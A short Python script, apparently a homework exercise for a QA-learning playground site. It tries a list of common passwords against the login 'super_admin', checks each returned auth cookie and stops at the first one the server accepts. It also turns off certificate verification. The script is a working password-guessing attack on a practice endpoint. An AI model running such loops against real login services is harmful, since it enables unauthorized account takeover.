import requests

passwords = [
    "123456", "password", "12345678", "qwerty", "12345", "123456789", "letmein","1234567", "football", "iloveyou",
    "admin", "welcome", "monkey", "login", "abc123","starwars","123123", "dragon", "passw0rd", "master", "michael",
    "superman", "654321", "sunshine", "princess"
]

for password_value in passwords:
    secret = {'login': 'super_admin', 'password': password_value}
    response_secret = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=secret, verify=False)
    print(response_secret.text)
    print(dict(response_secret.cookies))

    auth_cookie = response_secret.cookies.get('auth_cookie')
    cookies = {"auth_cookie": auth_cookie}

    response_check_auth_cookie = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie",cookies=cookies, verify=False)
    if response_check_auth_cookie.text == "You are NOT authorized":
        print('fail')

    else:
        print('успех')
        print(response_check_auth_cookie.text)
        print(response_secret.text)
        break

